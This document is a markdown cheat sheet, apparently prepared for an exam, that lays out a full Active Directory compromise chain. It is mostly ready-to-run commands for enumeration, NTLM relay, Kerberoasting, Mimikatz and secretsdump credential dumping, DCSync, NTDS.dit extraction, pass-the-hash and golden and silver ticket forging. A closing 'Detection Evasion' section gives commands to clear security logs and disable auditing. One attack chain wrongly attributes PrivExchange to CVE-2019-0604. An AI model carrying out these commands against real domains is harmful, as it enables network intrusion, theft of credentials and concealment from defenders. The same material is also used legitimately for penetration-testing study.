---
title: Active Directory Complete Attack Guide
description: Full AD exploitation chain from reconnaissance to domain compromise
tags: [active-directory, kerberos, exploitation, dcsynd, tickets]
---

# Active Directory Complete Attack Guide

Complete methodology for reconnoitering, exploiting, and compromising Active Directory environments.

## AD Attack Phases

```
Reconnaissance → Enumeration → Credentialing → Lateral Movement → 
Domain Controller Compromise → Persistence
```

## Phase 1: Reconnaissance

### Identifying AD Environment

```bash
# Check if you're on a domain-joined system
systeminfo | findstr Domain
wmic os get name,version

# DNS SRV record discovery
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local

# Find domain controllers
nmap -p 389,636 10.10.10.0/24
```

### Domain Information Gathering

```bash
# Get domain name
echo %userdomain%

# Get domain SID
whoami /user

# Find organizational units
ldapsearch -x -h DC -b "dc=domain,dc=local" "(objectClass=organizationalUnit)"

# Forest root domain
ldapsearch -x -h DC -b "" -s base
```

---

## Phase 2: Enumeration (Null/Unauthenticated)

### LDAP Anonymous Binding

```bash
# Test null LDAP bind
ldapsearch -x -h 10.10.10.X -b "dc=domain,dc=local"

# Get all users
ldapsearch -x -h 10.10.10.X -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName

# Get users with UPN
ldapsearch -x -h 10.10.10.X -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName userPrincipalName

# Get service accounts (high-value targets)
ldapsearch -x -h 10.10.10.X -b "dc=domain,dc=local" "(servicePrincipalName=*)" sAMAccountName

# Get admin users
ldapsearch -x -h 10.10.10.X -b "dc=domain,dc=local" "(adminCount=1)" sAMAccountName

# Get groups
ldapsearch -x -h 10.10.10.X -b "dc=domain,dc=local" "(objectClass=group)" cn members

# Password policy
ldapsearch -x -h 10.10.10.X -b "dc=domain,dc=local" "(objectClass=pwdPolicy)"
```

### SMB Enumeration (Null Session)

```bash
# List shares
smbclient -L //10.10.10.X -N

# Get users via netbios
enum4linux -u '' -p '' -r 10.10.10.X

# Get computer info
smbclient -L //10.10.10.X -N -c "shares"
```

### Kerberos User Enumeration

```bash
# Kerbrute user enumeration
kerbrute userenum users.txt -d domain.local

# Harvester (get valid users via Kerberos error messages)
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py domain.local/ -no-pass -usersfile users.txt
```

---

## Phase 3: Credentialing

### Credential Acquisition Paths

#### Path 1: NTLM Relay Attack

```bash
# Setup responder (capture NTLM hashes)
responder -I eth0 -v

# In another terminal: setup relay
ntlmrelayx.py -t smb://TARGET_SERVER

# Force target to connect (e.g., via SQL injection, LNK file, print server)
# Responder will capture hash or relay it
```

#### Path 2: Kerberoasting (TGS Extraction)

```bash
# Requires any valid AD credentials

# Get TGS for crackable users
python3 -m impacket.GetUserSPNs domain.local/user:password -request -outputfile tgs.txt

# Crack with hashcat
hashcat -m 13100 tgs.txt wordlist.txt

# Crack with john
john --format=krb5tgs --wordlist=wordlist.txt tgs.txt
```

#### Path 3: AS-REP Roasting (Pre-auth Disabled)

```bash
# Get hashes for users with pre-authentication disabled
python3 -m impacket.GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt

# Crack
hashcat -m 18200 hashes.txt wordlist.txt
```

#### Path 4: Password Spray

```bash
# Once you have a user list, spray common passwords
# Be careful: lockouts are common

# Using domain-joined machine
net use \\DOMAIN /user:domain\admin password

# Using Kerbrute
kerbrute bruteuser wordlist.txt user@domain.local --delay 1000
```

#### Path 5: Credential Harvesting

```bash
# If you have shell access to Windows machine with admin:

# Mimikatz (dumping credentials from memory)
mimikatz
> sekurlsa::logonpasswords
> sekurlsa::kerberos
> lsadump::lsa /patch

# LSASS dump (remotely)
python3 -m impacket.secretsdump domain.local/admin:password@TARGET

# DumpNTDS (dump all domain credentials)
python3 -m impacket.secretsdump -ntds ntds.dit -system SYSTEM local
```

---

## Phase 4: Post-Compromise Enumeration

### Privilege Context Assessment

```bash
# Check what you have
whoami
whoami /groups
whoami /priv

# Check if domain admin
net group "Domain Admins" /domain

# Check if in group with Kerberos delegation
ldapsearch -x -h DC -b "dc=domain,dc=local" "(userAccountControl:1.2.840.113556.1.4.803:=16777216)" sAMAccountName
```

### Bloodhound Collection

```bash
# Collect AD data
python3 /opt/BloodHound/BloodHound.py/BloodHound.py -c All -u user -p password -d domain.local -gc GC.domain.local -dc DC.domain.local

# Open in Bloodhound GUI to visualize attack paths
```

---

## Phase 5: Lateral Movement

### Pass-The-Ticket (PTT)

```bash
# Get TGT as current user
python3 -m impacket.getTGT domain.local/user:password

# Use TGT
export KRB5CCNAME=/tmp/user.ccache
python3 -m impacket.psexec domain.local/user@TARGET -k -no-pass

# Or with winexe
export KRB5CCNAME=/tmp/user.ccache
/usr/bin/pth-winexe -k // target.domain.local cmd.exe
```

### Pass-The-Hash (PTH)

```bash
# If you have NTLM hash
python3 -m impacket.psexec domain.local/user@TARGET -hashes :HASH

# With pth-winexe
pth-winexe -U domain\\user%aad3b435b51404eeaad3b435b51404ee:HASH //TARGET cmd.exe
```

### Overpass-The-Hash

```bash
# Use NTLM hash to get Kerberos TGT
python3 -m impacket.getTGT domain.local/user -hashes :HASH

# Use resulting ticket
export KRB5CCNAME=/tmp/user.ccache
python3 -m impacket.psexec domain.local/user@TARGET -k -no-pass
```

### Unconstrained Delegation Abuse

```bash
# If user has unconstrained delegation (check: userAccountControl:1.2.840.113556.1.4.803:=524288)

# Capture TGT from delegated user
# TGT will be automatically cached on machine with unconstrained delegation

# Use coercer to force DC to authenticate
python3 coercer.py -u user -p password -d domain.local -t TARGET -l DELEGATED_MACHINE

# Then extract TGT from delegated machine
python3 -m impacket.secretsdump domain.local/user:password@DELEGATED_MACHINE
```

### Constrained Delegation Abuse

```bash
# If user has constrained delegation to service

# Get user's TGT
python3 -m impacket.getTGT domain.local/user:password

# Forge TGS for delegated service
python3 -m impacket.ticketer -nthash HASH -domain-sid DOMAIN-SID -domain domain.local -spn SERVICE/TARGET user

# Use forged ticket
export KRB5CCNAME=/tmp/service.ccache
python3 -m impacket.psexec domain.local/user@TARGET -k -no-pass
```

---

## Phase 6: Domain Controller Compromise

### DCSync (Domain Replication Rights)

```bash
# Dump NTDS through replication
python3 -m impacket.secretsdump -k -no-pass domain.local/user@DC

# Or if you have domain admin
secretsdump.py domain.local/admin:password@DC
```

### Direct NTDS.dit Extraction

```bash
# Create shadow copy of C: drive
vssadmin create shadow /for=C:

# Copy NTDS.dit from shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit .

# Extract registry hives
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
reg save HKLM\SAM C:\Windows\Temp\SAM

# Parse locally
python3 -m impacket.secretsdump -sam SAM -system SYSTEM -ntds ntds.dit local
```

### Extracting Krbtgt Hash

```bash
# Get krbtgt hash (used for golden ticket)
python3 -m impacket.secretsdump domain.local/admin:password@DC | grep krbtgt
```

---

## Phase 7: Golden Ticket (Persistence/Escalation)

### Creating Golden Ticket

```bash
# Requirements: krbtgt NTLM hash, domain SID

# Create TGT valid for 10 years
python3 -m impacket.ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain domain.local admin

# Use golden ticket
export KRB5CCNAME=/tmp/admin.ccache
python3 -m impacket.psexec domain.local/admin@ANY_DC -k -no-pass
```

### Golden Ticket for Persistence

```bash
# Golden ticket lasts years (10 by default)
# Even password changes don't invalidate it
# Allows access to any service

# Use for accessing domain controllers
export KRB5CCNAME=/tmp/admin.ccache
python3 -m impacket.wmiexec domain.local/admin@DC -k -no-pass
```

---

## Phase 8: Silver Ticket (Service Compromise)

### Creating Silver Ticket

```bash
# Requirements: service account NTLM hash, domain SID, target service

# Forge TGS for CIFS service (SMB)
python3 -m impacket.ticketer -nthash COMPUTER_HASH -domain-sid DOMAIN_SID -domain domain.local -spn cifs/TARGET admin

# Use silver ticket
export KRB5CCNAME=/tmp/service.ccache
python3 -m impacket.psexec domain.local/admin@TARGET -k -no-pass
```

---

## Common AD Attack Chains

### Chain 1: From Low Priv to Domain Admin

```
1. Enumerate users (Kerbrute, LDAP)
2. Kerberoasting or AS-REP roasting
3. Crack hash
4. Lateral movement
5. Find path to domain admin (Bloodhound)
6. Exploit path (unconstrained delegation, etc)
7. Dump NTDS via DCSync
8. Create golden ticket
```

### Chain 2: Exploit Exchange for Escalation

```
1. Find Exchange server
2. Exploit PrivExchange (CVE-2019-0604)
3. Coerce DC authentication
4. Perform NTLM relay to gain admin rights
5. Dump NTDS
```

### Chain 3: Kerberoasting to Domain Admin

```
1. Find SPN records
2. Request TGS for each
3. Crack weak passwords
4. Gain admin access
5. Use admin to dump NTDS
```

---

## Detection Evasion

### Avoiding Detection

```bash
# Delete evidence
# On DC: Clear security logs
wevtutil cl security

# Disable audit policies
auditpol /set /category:* /success:disable /failure:disable

# Use legitimate tools (Living off the Land)
# Use built-in Windows tools instead of Mimikatz
```

### Timing and Volume

```bash
# Slow down attacks to avoid detection
# Avoid sudden spikes in authentication attempts
# Space out password spray attempts
# Use time delays in automation
```

---

## Common Misconfigurations to Exploit

### 1. LDAP Null Binding Enabled
Allows unauthenticated enumeration of users, groups, computers.

### 2. Kerberos Pre-authentication Disabled
Allows AS-REP roasting for users without pre-auth requirement.

### 3. Service Accounts with Simple Passwords
Kerberoasting extracts TGS which can be cracked offline.

### 4. Unconstrained Kerberos Delegation
Allows harvesting of any user's TGT for use on that computer.

### 5. Constrained Delegation Misconfiguration
Allows impersonation of privileged accounts.

### 6. NTLM Relay Attacks
If NTLM still used instead of Kerberos, can relay authentication.

### 7. Shared Local Admin Passwords
Same password across computers = lateral movement on compromise.

### 8. Weak Password Policies
Allows password spraying and brute force attacks.

---

## Tools Reference

```bash
# Enumeration
ldapsearch
enum4linux
kerbrute
GetNPUsers.py
GetUserSPNs.py
bloodhound.py

# Exploitation
secretsdump.py
getTGT.py
psexec.py
wmiexec.py
dcomexec.py
ticketer.py

# Credential Access
ntlmrelayx.py
responder
mimikatz
hashcat
john

# Persistence
ticketer.py (golden/silver tickets)
```

---

This is your complete AD exploitation reference. Use during exam for AD-heavy targets.

